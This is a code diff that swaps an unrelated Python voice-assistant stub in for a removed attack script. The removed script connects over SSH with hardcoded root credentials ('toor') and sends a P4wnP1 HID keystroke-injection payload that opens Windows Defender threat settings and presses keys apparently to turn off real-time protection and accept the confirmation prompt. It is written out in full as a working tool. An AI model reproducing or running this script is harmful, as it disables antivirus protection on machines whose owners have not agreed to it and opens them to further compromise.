@@ -1,47 +1,18 @@
-import paramiko
+from pyttsx3 import Engine
+import speech_recognition as sr
+import pyttsx3
+from time import sleep
+import datetime
 
-def ssh_execute_command(hostname, username, password, command):
-    try:
-        # Create an SSH client
-        ssh_client = paramiko.SSHClient()
+listener = sr.Recognizer()
+engine: Engine = pyttsx3.init('sapi5')
+voices = engine.getProperty('voices')
+engine.setProperty('voice', voices[0].id)
+engine.setProperty('rate', 171)
+engine.setProperty('volume', 150)
+engine.runAndWait()
 
-        # Automatically add the server's host key (this is insecure; see the warning below)
-        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-        # Connect to the remote server using password authentication
-        ssh_client.connect(hostname, username=username, password=password)
-
-        # Execute the command
-        stdin, stdout, stderr = ssh_client.exec_command(command)
-
-        # Print the output of the command
-        print("Command Output:")
-        print(stdout.read().decode())
-
-    except Exception as e:
-        print(f"Error: {e}")
-    finally:
-        # Close the SSH connection
-        ssh_client.close()
-
-# Replace these values with your own
-hostname = "192.168.23.205"
-username = "root"
-password = "toor"
-command_to_execute = """P4wnP1_cli hid run -c 'layout("us");
-press("GUI r");
-delay(500);
-type("windowsdefender://ThreatSettings")
-delay(200);
-press("ENTER");
-delay(1000);
-press("SPACE");
-delay(1000);
-press("SHIFT TAB");
-delay(200);
-press("ENTER");
-delay(500);
-press("ALT F4");' """
-
-# Call the function with your parameters
-ssh_execute_command(hostname, username, password, command_to_execute)
+def talk(text):
+    engine.say(text)
+    print(text)
+    engine.runAndWait()
